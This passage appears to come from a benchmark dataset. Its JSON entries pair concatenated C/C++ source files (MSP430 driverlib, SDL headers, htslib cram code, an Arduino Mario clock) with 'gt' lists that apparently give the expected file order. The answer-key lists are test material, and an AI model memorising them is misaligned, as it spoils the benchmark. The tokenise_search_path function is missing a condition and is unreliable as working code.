        "content": "'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/oa.h'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n#ifndef __MSP430WARE_OA_H__\n\n#define __MSP430WARE_OA_H__\n\n\n\n#include \"inc/hw_memmap.h\"\n\n\n\n#ifdef __MSP430_HAS_OA_0__\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#ifdef __cplusplus\n\nextern \"C\"\n\n{\n\n#endif\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#define OA_POSITIVE_INPUT_TERMINAL_SWITCH0                                 PSW0\n\n#define OA_POSITIVE_INPUT_TERMINAL_SWITCH1                                 PSW1\n\n#define OA_POSITIVE_INPUT_TERMINAL_SWITCH2                                 PSW2\n\n#define OA_POSITIVE_INPUT_TERMINAL_SWITCH3                                 PSW3\n\n#define OA_POSITIVE_INPUT_TERMINAL_NONE                                    0x00\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#define OA_NEGATIVE_INPUT_TERMINAL_SWITCH0                                 NSW0\n\n#define OA_NEGATIVE_INPUT_TERMINAL_SWITCH1                                 NSW1\n\n#define OA_NEGATIVE_INPUT_TERMINAL_SWITCH2                                 NSW2\n\n#define OA_NEGATIVE_INPUT_TERMINAL_SWITCH3                                 NSW3\n\n#define OA_NEGATIVE_INPUT_TERMINAL_SWITCH4                                 NSW4\n\n#define OA_NEGATIVE_INPUT_TERMINAL_NONE                                    0x00\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#define OA_GROUND_SWITCH0                                                  GSW0\n\n#define OA_GROUND_SWITCH1                                                  GSW1\n\n#define OA_GROUND_NONE                                                     0x00\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#define OA_POSITIVE_INPUT_TERMINAL_SWITCHES                                0x00\n\n#define OA_NEGATIVE_INPUT_TERMINAL_SWITCHES                                0x01\n\n#define OA_GROUND_SWITCHES                                                 0x02\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#define OA_INPUT_READY                                                 OARRIRDY\n\n#define OA_INPUT_NOT_READY                                                 0x00\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#define OA_INPUT_ENABLED                                                  OARRI\n\n#define OA_INPUT_DISABLED                                                (0x00)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#define OA_AMPLIFIER_MODE_ENABLED                                           OAM\n\n#define OA_AMPLIFIER_MODE_DISABLED                                       (0x00)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void OA_openSwitch(uint16_t baseAddress,\n\n                          uint8_t positiveInputMask,\n\n                          uint8_t negativeInputMask,\n\n                          uint8_t groundMask);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void OA_closeSwitch(uint16_t baseAddress,\n\n                           uint8_t positiveInputMask,\n\n                           uint8_t negativeInputMask,\n\n                           uint8_t groundMask);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern uint8_t OA_getSwitchStatus(uint16_t baseAddress,\n\n                                  uint8_t inputTerminal);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern uint8_t OA_getRailToRailInputReadyStatus(uint16_t baseAddress);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern uint8_t OA_getRailToRailInputStatus(uint16_t baseAddress);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void OA_enableRailToRailInput(uint16_t baseAddress);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void OA_disableRailToRailInput(uint16_t baseAddress);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void OA_disableAmplifierMode(uint16_t baseAddress);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void OA_enableAmplifierMode(uint16_t baseAddress);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern uint8_t OA_getAmplifierModeStatus(uint16_t baseAddress);\n\n\n\n\n\n\n\n\n\n\n\n\n\n#ifdef __cplusplus\n\n}\n\n#endif\n\n\n\n#endif\n\n#endif\n\n\n'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/driverlib.h'\n:\n\n#include \"inc/hw_memmap.h\"\n\n\n\n#include \"sysctl.h\"\n\n#include \"dma.h\"\n\n#include \"eusci_b_i2c.h\"\n\n#include \"rtc_b.h\"\n\n#include \"crc.h\"\n\n#include \"usci_a_uart.h\"\n\n#include \"flashctl.h\"\n\n#include \"ram.h\"\n\n#include \"dac12_a.h\"\n\n#include \"pmap.h\"\n\n#include \"mpy32.h\"\n\n#include \"rtc_a.h\"\n\n#include \"ucs.h\"\n\n#include \"aes.h\"\n\n#include \"tec.h\"\n\n#include \"usci_a_spi.h\"\n\n#include \"sfr.h\"\n\n#include \"wdt_a.h\"\n\n#include \"timer_a.h\"\n\n#include \"oa.h\"\n\n#include \"pmm.h\"\n\n#include \"lcd_b.h\"\n\n#include \"rtc_c.h\"\n\n#include \"adc10_a.h\"\n\n#include \"eusci_a_uart.h\"\n\n#include \"ctsd16.h\"\n\n#include \"usci_b_spi.h\"\n\n#include \"comp_b.h\"\n\n#include \"gpio.h\"\n\n#include \"tlv.h\"\n\n#include \"ldopwr.h\"\n\n#include \"adc12_a.h\"\n\n#include \"ref.h\"\n\n#include \"eusci_a_spi.h\"\n\n#include \"timer_b.h\"\n\n#include \"battbak.h\"\n\n#include \"usci_b_i2c.h\"\n\n#include \"eusci_b_spi.h\"\n\n#include \"timer_d.h\"\n\n#include \"lcd_c.h\"\n\n#include \"sd24_b.h\"\n\n\n'KFDtool/fw/KFDtool/InfoData.c'\n:\n\n\n\n\n\n#include \"driverlib.h\"\n\n#include \"InfoData.h\"\n\n\n\n#define INFOB_START (0x1900)\n\n#define INFOB_LENGTH (128)\n\n\n\n#define INFOC_START (0x1880)\n\n#define INFOC_LENGTH (128)\n\n\n\nuint16_t idWriteModelIdHwRev(uint8_t hwId, uint8_t hwRevMaj, uint8_t hwRevMin)\n\n{\n\n    uint8_t data[5];\n\n\n\n    data[0] = 0x10;\n\n    data[1] = hwId;\n\n    data[2] = hwRevMaj;\n\n    data[3] = hwRevMin;\n\n    data[4] = 0x11;\n\n\n\n    uint16_t status;\n\n\n\n    do\n\n    {\n\n        FlashCtl_eraseSegment((uint8_t *)INFOB_START);\n\n        status = FlashCtl_performEraseCheck((uint8_t *)INFOB_START, INFOB_LENGTH);\n\n    } while (status == STATUS_FAIL);\n\n\n\n    FlashCtl_write8(data, (uint8_t *)INFOB_START, sizeof(data));\n\n\n\n    return 1;\n\n}\n\n\n\nuint16_t idWriteSerNum(uint8_t ser0, uint8_t ser1, uint8_t ser2, uint8_t ser3, uint8_t ser4, uint8_t ser5)\n\n{\n\n    uint8_t data[8];\n\n\n\n    data[0] = 0x20;\n\n    data[1] = ser0;\n\n    data[2] = ser1;\n\n    data[3] = ser2;\n\n    data[4] = ser3;\n\n    data[5] = ser4;\n\n    data[6] = ser5;\n\n    data[7] = 0x22;\n\n\n\n    uint16_t status;\n\n\n\n    do\n\n    {\n\n        FlashCtl_eraseSegment((uint8_t *)INFOC_START);\n\n        status = FlashCtl_performEraseCheck((uint8_t *)INFOC_START, INFOC_LENGTH);\n\n    } while (status == STATUS_FAIL);\n\n\n\n    FlashCtl_write8(data, (uint8_t *)INFOC_START, sizeof(data));\n\n\n\n    return 1;\n\n}\n\n\n\nuint16_t idReadModelId(uint8_t *hwId)\n\n{\n\n    uint16_t *flashPtr;\n\n\n\n    flashPtr = (uint16_t *)INFOB_START;\n\n\n\n    uint8_t header;\n\n    uint8_t footer;\n\n\n\n    header = *flashPtr;\n\n    *hwId = (*flashPtr >> 8);\n\n    *flashPtr++;\n\n    *flashPtr++;\n\n    footer = *flashPtr;\n\n\n\n    if (header == 0x10 && footer == 0x11)\n\n    {\n\n        return 1;\n\n    }\n\n    else\n\n    {\n\n        return 0;\n\n    }\n\n}\n\n\n\nuint16_t idReadHwRev(uint8_t *hwRevMaj, uint8_t *hwRevMin)\n\n{\n\n    uint16_t *flashPtr;\n\n\n\n    flashPtr = (uint16_t *)INFOB_START;\n\n\n\n    uint8_t header;\n\n    uint8_t footer;\n\n\n\n    header = *flashPtr;\n\n    *flashPtr++;\n\n    *hwRevMaj = *flashPtr;\n\n    *hwRevMin = (*flashPtr >> 8);\n\n    *flashPtr++;\n\n    footer = *flashPtr;\n\n\n\n    if (header == 0x10 && footer == 0x11)\n\n    {\n\n        return 1;\n\n    }\n\n    else\n\n    {\n\n        return 0;\n\n    }\n\n}\n\n\n\nuint16_t idReadSerNum(uint8_t *ser0, uint8_t *ser1, uint8_t *ser2, uint8_t *ser3, uint8_t *ser4, uint8_t *ser5)\n\n{\n\n    uint16_t *flashPtr;\n\n\n\n    flashPtr = (uint16_t *)INFOC_START;\n\n\n\n    uint8_t header;\n\n    uint8_t footer;\n\n\n\n    header = *flashPtr;\n\n    *ser0 = (*flashPtr >> 8);\n\n    *flashPtr++;\n\n    *ser1 = *flashPtr;\n\n    *ser2 = (*flashPtr >> 8);\n\n    *flashPtr++;\n\n    *ser3 = *flashPtr;\n\n    *ser4 = (*flashPtr >> 8);\n\n    *flashPtr++;\n\n    footer = (*flashPtr >> 8);\n\n    *ser5 = *flashPtr;\n\n\n\n    if (header == 0x20 && footer == 0x22)\n\n    {\n\n        return 1;\n\n    }\n\n    else\n\n    {\n\n        return 0;\n\n    }\n\n}\n\n",
        "gt": [
            "'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/oa.h'",
            "'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/driverlib.h'",
            "'KFDtool/fw/KFDtool/InfoData.c'"
        ]
    },
    {
        "files": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_system.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_images.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'"
        ],
        "content": "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_system.h'\n:\n\n\n\n#ifndef _SDL_system_h\n#define _SDL_system_h\n\n#include \"SDL_stdinc.h\"\n#include \"SDL_keyboard.h\"\n#include \"SDL_render.h\"\n#include \"SDL_video.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n#ifdef __WIN32__\n\n\ntypedef void (SDLCALL * SDL_WindowsMessageHook)(void *userdata, void *hWnd, unsigned int message, Uint64 wParam, Sint64 lParam);\nextern DECLSPEC void SDLCALL SDL_SetWindowsMessageHook(SDL_WindowsMessageHook callback, void *userdata);\n\n\nextern DECLSPEC int SDLCALL SDL_Direct3D9GetAdapterIndex( int displayIndex );\n\ntypedef struct IDirect3DDevice9 IDirect3DDevice9;\n\nextern DECLSPEC IDirect3DDevice9* SDLCALL SDL_RenderGetD3D9Device(SDL_Renderer * renderer);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_DXGIGetOutputInfo( int displayIndex, int *adapterIndex, int *outputIndex );\n\n#endif\n\n\n\n#if defined(__IPHONEOS__) && __IPHONEOS__\n\n#define SDL_iOSSetAnimationCallback(window, interval, callback, callbackParam) SDL_iPhoneSetAnimationCallback(window, interval, callback, callbackParam)\nextern DECLSPEC int SDLCALL SDL_iPhoneSetAnimationCallback(SDL_Window * window, int interval, void (*callback)(void*), void *callbackParam);\n\n#define SDL_iOSSetEventPump(enabled) SDL_iPhoneSetEventPump(enabled)\nextern DECLSPEC void SDLCALL SDL_iPhoneSetEventPump(SDL_bool enabled);\n\n#endif\n\n\n\n#if defined(__ANDROID__) && __ANDROID__\n\n\nextern DECLSPEC void * SDLCALL SDL_AndroidGetJNIEnv();\n\n\nextern DECLSPEC void * SDLCALL SDL_AndroidGetActivity();\n\n\n#define SDL_ANDROID_EXTERNAL_STORAGE_READ   0x01\n#define SDL_ANDROID_EXTERNAL_STORAGE_WRITE  0x02\n\n\nextern DECLSPEC const char * SDLCALL SDL_AndroidGetInternalStoragePath();\n\n\nextern DECLSPEC int SDLCALL SDL_AndroidGetExternalStorageState();\n\n\nextern DECLSPEC const char * SDLCALL SDL_AndroidGetExternalStoragePath();\n\n#endif\n\n\n#if defined(__WINRT__) && __WINRT__\n\n\ntypedef enum\n{\n\n    SDL_WINRT_PATH_INSTALLED_LOCATION,\n\n\n    SDL_WINRT_PATH_LOCAL_FOLDER,\n\n\n    SDL_WINRT_PATH_ROAMING_FOLDER,\n\n\n    SDL_WINRT_PATH_TEMP_FOLDER\n} SDL_WinRT_Path;\n\n\n\nextern DECLSPEC const wchar_t * SDLCALL SDL_WinRTGetFSPathUNICODE(SDL_WinRT_Path pathType);\n\n\nextern DECLSPEC const char * SDLCALL SDL_WinRTGetFSPathUTF8(SDL_WinRT_Path pathType);\n\n#endif\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_images.h'\n:\n\n\n\n\n\n#ifndef _SDL_test_images_h\n#define _SDL_test_images_h\n\n#include \"SDL.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\ntypedef struct SDLTest_SurfaceImage_s {\n  int width;\n  int height;\n  unsigned int bytes_per_pixel;\n  const char *pixel_data;\n} SDLTest_SurfaceImage_t;\n\n\nSDL_Surface *SDLTest_ImageBlit();\nSDL_Surface *SDLTest_ImageBlitColor();\nSDL_Surface *SDLTest_ImageBlitAlpha();\nSDL_Surface *SDLTest_ImageBlitBlendAdd();\nSDL_Surface *SDLTest_ImageBlitBlend();\nSDL_Surface *SDLTest_ImageBlitBlendMod();\nSDL_Surface *SDLTest_ImageBlitBlendNone();\nSDL_Surface *SDLTest_ImageBlitBlendAll();\nSDL_Surface *SDLTest_ImageFace();\nSDL_Surface *SDLTest_ImagePrimitives();\nSDL_Surface *SDLTest_ImagePrimitivesBlend();\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'\n:\n\n\n\n#ifndef _SDL_test_h\n#define _SDL_test_h\n\n#include \"SDL.h\"\n#include \"SDL_test_common.h\"\n#include \"SDL_test_font.h\"\n#include \"SDL_test_random.h\"\n#include \"SDL_test_fuzzer.h\"\n#include \"SDL_test_crc32.h\"\n#include \"SDL_test_md5.h\"\n#include \"SDL_test_log.h\"\n#include \"SDL_test_assert.h\"\n#include \"SDL_test_harness.h\"\n#include \"SDL_test_images.h\"\n#include \"SDL_test_compare.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n#define SDLTEST_MAX_LOGMESSAGE_LENGTH   3584\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'\n:\n\n\n\n\n#ifndef _SDL_H\n#define _SDL_H\n\n#include \"SDL_main.h\"\n#include \"SDL_stdinc.h\"\n#include \"SDL_assert.h\"\n#include \"SDL_atomic.h\"\n#include \"SDL_audio.h\"\n#include \"SDL_clipboard.h\"\n#include \"SDL_cpuinfo.h\"\n#include \"SDL_endian.h\"\n#include \"SDL_error.h\"\n#include \"SDL_events.h\"\n#include \"SDL_filesystem.h\"\n#include \"SDL_joystick.h\"\n#include \"SDL_gamecontroller.h\"\n#include \"SDL_haptic.h\"\n#include \"SDL_hints.h\"\n#include \"SDL_loadso.h\"\n#include \"SDL_log.h\"\n#include \"SDL_messagebox.h\"\n#include \"SDL_mutex.h\"\n#include \"SDL_power.h\"\n#include \"SDL_render.h\"\n#include \"SDL_rwops.h\"\n#include \"SDL_system.h\"\n#include \"SDL_thread.h\"\n#include \"SDL_timer.h\"\n#include \"SDL_version.h\"\n#include \"SDL_video.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n\n#define SDL_INIT_TIMER          0x00000001u\n#define SDL_INIT_AUDIO          0x00000010u\n#define SDL_INIT_VIDEO          0x00000020u\n#define SDL_INIT_JOYSTICK       0x00000200u\n#define SDL_INIT_HAPTIC         0x00001000u\n#define SDL_INIT_GAMECONTROLLER 0x00002000u\n#define SDL_INIT_EVENTS         0x00004000u\n#define SDL_INIT_NOPARACHUTE    0x00100000u\n#define SDL_INIT_EVERYTHING ( \\\n                SDL_INIT_TIMER | SDL_INIT_AUDIO | SDL_INIT_VIDEO | SDL_INIT_EVENTS | \\\n                SDL_INIT_JOYSTICK | SDL_INIT_HAPTIC | SDL_INIT_GAMECONTROLLER \\\n            )\n\n\n\nextern DECLSPEC int SDLCALL SDL_Init(Uint32 flags);\n\n\nextern DECLSPEC int SDLCALL SDL_InitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_QuitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC Uint32 SDLCALL SDL_WasInit(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_Quit(void);\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n",
        "gt": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_system.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_images.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'"
        ]
    },
    {
        "files": [
            "'pblat/htslib/cram/mFILE.h'",
            "'pblat/htslib/cram/open_trace_file.h'",
            "'pblat/htslib/cram/open_trace_file.c'"
        ],
        "content": "'pblat/htslib/cram/mFILE.h'\n:\n\n#ifndef _MFILE_H_\n#define _MFILE_H_\n\n#include <stdio.h>\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\ntypedef struct {\n    FILE *fp;\n    char *data;\n    size_t alloced;\n    int eof;\n    int mode;\n    size_t size;\n    size_t offset;\n    size_t flush_pos;\n} mFILE;\n\n#define MF_READ    1\n#define MF_WRITE   2\n#define MF_APPEND  4\n#define MF_BINARY  8\n#define MF_TRUNC  16\n#define MF_MODEX  32\n#define MF_MMAP   64\n\nmFILE *mfreopen(const char *path, const char *mode, FILE *fp);\nmFILE *mfopen(const char *path, const char *mode);\nint mfdetach(mFILE *mf);\nint mfclose(mFILE *mf);\nint mfdestroy(mFILE *mf);\nint mfseek(mFILE *mf, long offset, int whence);\nlong mftell(mFILE *mf);\nvoid mrewind(mFILE *mf);\nvoid mftruncate(mFILE *mf, long offset);\nint mfeof(mFILE *mf);\nsize_t mfread(void *ptr, size_t size, size_t nmemb, mFILE *mf);\nsize_t mfwrite(void *ptr, size_t size, size_t nmemb, mFILE *mf);\nint mfgetc(mFILE *mf);\nint mungetc(int c, mFILE *mf);\nmFILE *mfcreate(char *data, int size);\nmFILE *mfcreate_from(const char *path, const char *mode_str, FILE *fp);\nvoid mfrecreate(mFILE *mf, char *data, int size);\nvoid *mfsteal(mFILE *mf, size_t *size_out);\nchar *mfgets(char *s, int size, mFILE *mf);\nint mfflush(mFILE *mf);\nint mfprintf(mFILE *mf, char *fmt, ...);\nmFILE *mstdin(void);\nmFILE *mstdout(void);\nmFILE *mstderr(void);\nvoid mfascii(mFILE *mf);\n\n#ifdef __cplusplus\n}\n#endif\n\n#endif\n\n'pblat/htslib/cram/open_trace_file.h'\n:\n\n\n\n#ifndef _OPEN_TRACE_FILE_H_\n#define _OPEN_TRACE_FILE_H_\n\n#include \"cram/mFILE.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\nchar *tokenise_search_path(char *searchpath);\n\n\nmFILE *open_path_mfile(char *file, char *path, char *relative_to);\n\n\nmFILE *find_file_url(char *file, char *url);\n\n\n\nchar *find_path(char *file, char *path);\n\n#ifdef __cplusplus\n}\n#endif\n\n#endif\n\n'pblat/htslib/cram/open_trace_file.c'\n:\n\n\n\n#include <config.h>\n\n#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\n#include <unistd.h>\n#include <ctype.h>\n#include <limits.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include \"cram/os.h\"\n#ifndef PATH_MAX\n#  define PATH_MAX 1024\n#endif\n\n#include \"cram/open_trace_file.h\"\n#include \"cram/misc.h\"\n#include \"htslib/hfile.h\"\n\n\nchar *tokenise_search_path(char *searchpath) {\n    char *newsearch;\n    unsigned int i, j;\n    size_t len;\n#ifdef _WIN32\n    char path_sep = ';';\n#else\n    char path_sep = ':';\n#endif\n\n    if (!searchpath)\n\tsearchpath=\"\";\n\n    newsearch = (char *)malloc((len = strlen(searchpath))+5);\n    if (!newsearch)\n\treturn NULL;\n\n    for (i = 0, j = 0; i < len; i++) {\n\n\t    if (j && newsearch[j-1] != 0)\n\t\tnewsearch[j++] = 0;\n\t} else {\n\t    newsearch[j++] = searchpath[i];\n\t}\n    }\n\n    if (j)\n\tnewsearch[j++] = 0;\n    newsearch[j++] = '.';\n    newsearch[j++] = '/';\n    newsearch[j++] = 0;\n    newsearch[j++] = 0;\n\n    return newsearch;\n}\n\nmFILE *find_file_url(char *file, char *url) {\n    char buf[8192], *cp;\n    mFILE *mf = NULL;\n    int maxlen = 8190 - strlen(file), len;\n    hFILE *hf;\n\n\n    for (cp = buf; *url && cp - buf < maxlen; url++) {\n\tif (*url == '%' && *(url+1) == 's') {\n\t    url++;\n\t    cp += strlen(strcpy(cp, file));\n\t} else {\n\t    *cp++ = *url;\n\t}\n    }\n    *cp++ = 0;\n\n    if (!(hf = hopen(buf, \"r\")))\n\treturn NULL;\n\n    if (NULL == (mf = mfcreate(NULL, 0)))\n\treturn NULL;\n    while ((len = hread(hf, buf, 8192)) > 0) {\n\tif (mfwrite(buf, len, 1, mf) <= 0) {\n\t    hclose_abruptly(hf);\n\t    mfdestroy(mf);\n\t    return NULL;\n\t}\n    }\n    if (hclose(hf) < 0) {\n\tmfdestroy(mf);\n\treturn NULL;\n    }\n\n    mrewind(mf);\n    return mf;\n}\n\n\nstatic char *expand_path(char *file, char *dirname) {\n    size_t len = strlen(dirname);\n    size_t lenf = strlen(file);\n    char *cp, *path;\n\n    path = malloc(len+lenf+2);\n    if (!path)\n\treturn NULL;\n\n    if (dirname[len-1] == '/')\n\tlen--;\n\n\n    if (*file == '/' || (len==1 && *dirname == '.')) {\n\tsprintf(path, \"%s\", file);\n    } else {\n\n\tchar *path_end = path;\n\t*path = 0;\n\twhile ((cp = strchr(dirname, '%'))) {\n\t    char *endp;\n\t    long l = strtol(cp+1, &endp, 10);\n\t    if (*endp != 's') {\n\t\tstrncpy(path_end, dirname, (endp+1)-dirname);\n\t\tpath_end += (endp+1)-dirname;\n\t\tdirname = endp+1;\n\t\tcontinue;\n\t    }\n\n\t    strncpy(path_end, dirname, cp-dirname);\n\t    path_end += cp-dirname;\n\t    if (l) {\n\t\tstrncpy(path_end, file, l);\n\t\tpath_end += MIN(strlen(file), l);\n\t\tfile     += MIN(strlen(file), l);\n\t    } else {\n\t\tstrcpy(path_end, file);\n\t\tpath_end += strlen(file);\n\t\tfile     += strlen(file);\n\t    }\n\t    len -= (endp+1) - dirname;\n\t    dirname = endp+1;\n\t}\n\tstrncpy(path_end, dirname, len);\n\tpath_end += MIN(strlen(dirname), len);\n\t*path_end = 0;\n\tif (*file) {\n\t    *path_end++ = '/';\n\t    strcpy(path_end, file);\n\t}\n    }\n\n\n    return path;\n}\n\n\nstatic mFILE *find_file_dir(char *file, char *dirname) {\n    char *path;\n    mFILE *mf = NULL;\n\n    path = expand_path(file, dirname);\n\n    if (is_file(path))\n\tmf = mfopen(path, \"rbm\");\n\n    free(path);\n    return mf;\n}\n\n\n\n\nmFILE *open_path_mfile(char *file, char *path, char *relative_to) {\n    char *newsearch;\n    char *ele;\n    mFILE *fp;\n\n\n    if (!path)\n\tpath = getenv(\"RAWDATA\");\n    if (NULL == (newsearch = tokenise_search_path(path)))\n\treturn NULL;\n\n\n    for (ele = newsearch; *ele; ele += strlen(ele)+1) {\n\tchar *ele2;\n\n\n\tif (*ele == '|') {\n\t    ele2 = ele+1;\n\t} else {\n\t    ele2 = ele;\n\t}\n\n\tif (0 == strncmp(ele2, \"URL=\", 4)) {\n\t    if ((fp = find_file_url(file, ele2+4))) {\n\t\tfree(newsearch);\n\t\treturn fp;\n\t    }\n\t} else if (!strncmp(ele2, \"http:\", 5) ||\n\t\t   !strncmp(ele2, \"ftp:\", 4)) {\n\t    if ((fp = find_file_url(file, ele2))) {\n\t\tfree(newsearch);\n\t\treturn fp;\n\t    }\n\t} else if ((fp = find_file_dir(file, ele2))) {\n\t    free(newsearch);\n\t    return fp;\n\t}\n    }\n\n    free(newsearch);\n\n\n    if (relative_to) {\n\tchar *cp;\n\tchar relative_path[PATH_MAX+1];\n\tstrcpy(relative_path, relative_to);\n\tif ((cp = strrchr(relative_path, '/')))\n\t    *cp = 0;\n\tif ((fp = find_file_dir(file, relative_path)))\n\t    return fp;\n    }\n\n    return NULL;\n}\n\n\n\nchar *find_path(char *file, char *path) {\n    char *newsearch;\n    char *ele;\n    char *outpath = NULL;\n\n\n    if (!path)\n\tpath = getenv(\"RAWDATA\");\n    if (NULL == (newsearch = tokenise_search_path(path)))\n\treturn NULL;\n\n    for (ele = newsearch; *ele; ele += strlen(ele)+1) {\n\tchar *ele2 = (*ele == '|') ? ele+1 : ele;\n\n\tif (!strncmp(ele2, \"URL=\", 4) ||\n\t    !strncmp(ele2, \"http:\", 5) ||\n\t    !strncmp(ele2, \"ftp:\", 4)) {\n\t    continue;\n\t} else {\n\t    outpath = expand_path(file, ele2);\n\t    if (is_file(outpath)) {\n\t\tfree(newsearch);\n\t\treturn outpath;\n\t    } else {\n\t\tfree(outpath);\n\t    }\n\t}\n    }\n\n    free(newsearch);\n\n    return NULL;\n}\n",
        "gt": [
            "'pblat/htslib/cram/mFILE.h'",
            "'pblat/htslib/cram/open_trace_file.h'",
            "'pblat/htslib/cram/open_trace_file.c'"
        ]
    },
    {
        "files": [
            "'mariobros-clock/Locator.h'",
            "'mariobros-clock/EventBus.h'",
            "'mariobros-clock/Clockface.h'",
            "'mariobros-clock/Sprite.h'",
            "'mariobros-clock/mario.h'"
        ],
        "content": "'mariobros-clock/Locator.h'\n:#ifndef Locator_h\n#define Locator_h\n\n\n#include <Adafruit_GFX.h>\n#include \"EventBus.h\"\n\nclass Locator {\n  private:\n    static Adafruit_GFX* _display;\n    static EventBus* _eventBus;\n\n  public:\n    static Adafruit_GFX* getDisplay();\n    static EventBus* getEventBus();\n    static void provide(Adafruit_GFX* display);\n    static void provide(EventBus* eventBus);\n};\n\n\n#endif\n'mariobros-clock/EventBus.h'\n:\n#ifndef EventBus_h\n#define EventBus_h\n\n#include <Arduino.h>\n#include \"EventTask.h\"\n#include \"Sprite.h\"\n\nclass EventBus {\n  private:\n    EventTask* _subscriptions[5];\n    uint8_t _subNum = 0;\n\n  public:\n    void broadcast(EventType event, Sprite* sender);\n    void subscribe(EventTask* task);\n\n};\n\n\n#endif\n\n'mariobros-clock/Clockface.h'\n:#ifndef MarioClockface_h\n#define MarioClockface_h\n\n#include \"Super_Mario_Bros__24pt7b.h\"\n\n#include <Adafruit_GFX.h>\n#include \"Tile.h\"\n#include \"Locator.h\"\n#include \"Game.h\"\n#include \"Object.h\"\n\n#include \"IClockface.h\"\n#include \"CWDateTime.h\"\n\n#include \"assets.h\"\n#include \"mario.h\"\n#include \"block.h\"\n\nclass Clockface: public IClockface {\n  private:\n    Adafruit_GFX* _display;\n    CWDateTime* _dateTime;\n    void updateTime();\n\n  public:\n    Clockface(Adafruit_GFX* display);\n    void setup(CWDateTime *dateTime);\n    void update();\n    void externalEvent(int type);\n};\n\n#endif\n\n'mariobros-clock/Sprite.h'\n:\n#ifndef Sprite_h\n#define Sprite_h\n\n#include <Arduino.h>\n\nclass Sprite {\n\n  protected:\n    uint8_t _x;\n    uint8_t _y;\n    uint8_t _width;\n    uint8_t _height;\n\n  public:\n    boolean collidedWith(Sprite* sprite);\n    void logPosition();\n\n    virtual const char* name();\n};\n\n\n#endif\n\n'mariobros-clock/mario.h'\n:#ifndef Mario_h\n#define Mario_h\n\n\n#include \"Game.h\"\n#include \"Locator.h\"\n#include \"EventBus.h\"\n#include \"assets.h\"\n\n\nconst uint8_t MARIO_PACE = 3;\nconst uint8_t MARIO_JUMP_HEIGHT = 14;\n\n\nclass Mario: public Sprite, public EventTask {\n  private:\n\n    enum State {\n      IDLE,\n      WALKING,\n      JUMPING\n    